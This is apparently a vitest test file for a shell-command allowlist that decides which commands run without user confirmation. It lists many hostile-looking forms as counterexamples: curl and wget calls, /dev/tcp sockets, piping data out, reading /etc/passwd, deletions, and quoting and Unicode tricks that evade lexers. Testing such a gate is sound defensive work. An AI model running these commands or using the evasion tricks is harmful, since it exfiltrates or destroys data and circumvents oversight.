import { describe, expect, it } from "vitest";
import { isReadOnlyCommand, lexStrict } from "../../src/decisions/shell-readonly.js";

// Spec §7.2 (codex B28, senior B10): at hostile a shell command runs without a tap ONLY if every segment is on a positive
// read-only list with its listed argument forms. Each counterexample here writes, runs a program, or hides a token; the
// spec's gate asks for each. The lexer keeps prefixes and wrappers (command-matcher drops them) and fails closed.
const READ_ONLY = ["ls", "ls -la src", "cat README.md", "head -n 5 a.txt", "tail -20 log.txt", "wc -l a b", "cut -d, -f1 data.csv", "stat package.json", "pwd",
  'echo "hello world"', "date", "date +%F", "grep -rn foo src", "grep -i TODO a.ts", "jq .name package.json", "find . -name '*.ts' -type f",
  "find src -maxdepth 2 -type d -print", "ls | head", "pwd && ls", "cat a.txt | grep x | wc -l"];
const ASKS = ["curl https://example.com", "touch x", "git log", "git diff --output=x", "git log --output=x", "file -C -m x", "sort -o out in", "sed 'w f' in",
  "awk '{print}' a", "rg --pre cat x", "diff a b", "X=1 ls", "env ls", "xargs cat", "nice ls", "timeout 5 ls", "command ls", "exec ls", "builtin echo hi",
  "sudo ls", "ls > out", "echo hi >> f", "ls $(whoami)", "ls `pwd`", "cat x | sh", "cat x | python3", "find . -delete", "find . -exec rm {} \;",
  "find . -fprint out", "date -s 2020-01-01", "date 0101", "grep -f /etc/x y", "grep -rf pats y", "jq --rawfile a f .", "jq --slurpfile a f .",
  "cat <<EOF\nx\nEOF", "ls & rm x", "ls; rm x", "ls\nrm x", "/bin/ls", "l\\s", "cat ~/x #comment", "ls | tee out", "find * -name x", "find ./sub* -type f"];

describe("hostile read-only list", () => {
  it("admits the listed programs in their listed forms", () => { for (const c of READ_ONLY) expect([c, isReadOnlyCommand(c)]).toEqual([c, true]); });
  it("asks for every counterexample", () => { for (const c of ASKS) expect([c, isReadOnlyCommand(c)]).toEqual([c, false]); });
  it("the lexer keeps an env prefix and a wrapper as words, and refuses what it cannot lex", () => {
    expect(lexStrict("X=1 ls")).toEqual({ ok: true, segments: [["X=1", "ls"]] });
    expect(lexStrict("ls 'unterminated").ok).toBe(false);
    expect(lexStrict('echo "a $HOME"').ok).toBe(false);
  });
});

// The list is the real hostile gate (tool.shell_netread is best effort): an allowlist that fails closed. Every form below
// either reads the network, writes, runs another program, hides a token from the lexer, or is one the lexer cannot prove,
// so it must ask. Task 8's whole attack table rides along: a form that slipped the classifier must not slip this list.
const TASK8_FORMS = ["curl https://example.com", "wget -qO- http://x.example", "ssh paco@mini uptime", "git fetch origin", "nc example.com 80",
  "cat list.txt | xargs curl -s", "for u in a b; do curl -s https://$u.example; done", "env FOO=1 curl https://x", "/usr/bin/curl https://x",
  "bash -c \"curl x\"", "sh -c 'curl x'", "eval curl x", "echo $(curl x)", "echo `curl x`", "echo x | curl -d @- y", "a; curl y", "a && wget y",
  "sudo -u u curl x", "timeout -s KILL 5 curl x", "command -p curl x", "xargs -n1 curl", "xargs -I{} curl {}", "env -i curl x", "nice -n 5 curl x",
  "find . -exec curl {} \;", "find . -execdir sh {} \;", "\\curl x", "bash <<< \"curl x\"", "echo 'curl x' | bash", "source <(curl -s x)",
  "exec 3<>/dev/tcp/evil/80", "cat < /dev/tcp/h/80", "c\"\"url x", "'cu''rl' x", "cu\\rl x", "curl$IFS'x'", "echo hi > /dev/udp/h/53",
  "\"w\"g\"e\"t x", "$CMD https://x", "sudo $CMD x", "/usr/bin/cu* x", "c?rl x", "ls && curl -s x | jq .", "cd repo; git pull || true",
  "make build & wget -q x", "test -f a || (cd b && git fetch)", "for f in *.txt; do echo $f; done; ssh mini ls"];
const WRITE_FLAGS = ["find . -delete", "find . -name x -delete", "find . -fprintf out %p", "find . -ok rm {} ;", "find . -name x -o -delete",
  "find . ! -name x", "find -L . -name x", "find . -name *.ts", "find . -newer", "find . -printf %p", "sort -o out in", "sort in", "sed -i s/a/b/ f",
  "sed -n 'w out' f", "git log --output=x", "git status", "tee out", "ls | tee out", "less x", "less +!sh x", "more x", "man ls", "vi x",
  "xargs", "ls | xargs rm", "cat x | xargs", "awk 'BEGIN{system(\"id\")}'", "perl -e 1", "python3 x.py", "node x.js", "cp a b", "mv a b",
  "rm x", "mkdir d", "chmod +x f", "ln -s a b", "dd if=a of=b", "truncate -s0 f", "open x", "osascript -e x", "grep -f pats y",
  "grep --file=pats y", "grep --file pats y", "grep -rnf pats y", "grep -e x -f pats y", "grep -- -f x", "grep -P x f", "grep -d skip x f",
  "grep x *", "grep -ef x", "jq -f prog.jq", "jq --from-file p .", "jq -L dir .", "jq --args . a b", "jq --rawfile=a f .", "jq . *.json",
  "jq -n --unknown .", "date -s 0101", "date -u 0101", "date +%F extra", "date *", "date +*", "date -f %s 0 +%F", "date -r 0", "date -u"];
const LEXER_TRICKS = ["\"ls\"", "'ls'", "l''s", "\"ls\" -la", "echo \"hi!\"", "echo hi\\!", "echo ${HOME}", "ls \"$(id)\"", "cat <(ls)",
  "echo $'\\x41'", "ls {a,b}", "(ls)", "{ ls; }", "if ls; then ls; fi", "time ls", "! ls", "coproc ls", "[[ -f x ]]", "[ -f x ]",
  "test -f x", "ls 2>/dev/null", "ls &>out", "cat </etc/passwd", "cat <> f", "ls >| out", "ls |& cat", "ls |", "| ls", "ls &&",
  "ls ||", "ls &", "ls ||| head", "", "   ", "ls \\\n-la", "ls #x", "IFS=x ls", "ls; X=1", "ⅼs", "l​s", "ls\u0000", "cat a\rb",
  "cat /dev/tcp/h/80", "echo '", "echo \"unterminated", "ls -la"];

describe("hostile read-only list: adversarial table (fail closed)", () => {
  it("asks for every Task 8 attack form", () => { for (const c of TASK8_FORMS) expect([c, isReadOnlyCommand(c)]).toEqual([c, false]); });
  it("asks for every write flag, unlisted program and unlisted flag", () => { for (const c of WRITE_FLAGS) expect([c, isReadOnlyCommand(c)]).toEqual([c, false]); });
  it("asks for every quoting, expansion, redirect, keyword and syntax trick", () => { for (const c of LEXER_TRICKS) expect([c, isReadOnlyCommand(c)]).toEqual([c, false]); });
  it("still admits the everyday read-only forms (a list that asks for everything would train Paco to tap blind)", () => {
    for (const c of ["ls *.txt", "cat ~/notes.txt", "grep -rn --include='*.ts' foo src", "grep -e -x file", "grep -A3 x f", "grep -c x f || echo none",
      "jq -r --arg n v '.[$n]' f.json", "find . -name '*.ts' -newer package.json", "head -n 5 a | tail -1", "echo '$HOME'",
      "date '+%Y-%m-%d %H:%M'", "ls -la; pwd", "wc -l src/*.ts"]) expect([c, isReadOnlyCommand(c)]).toEqual([c, true]);
  });
});
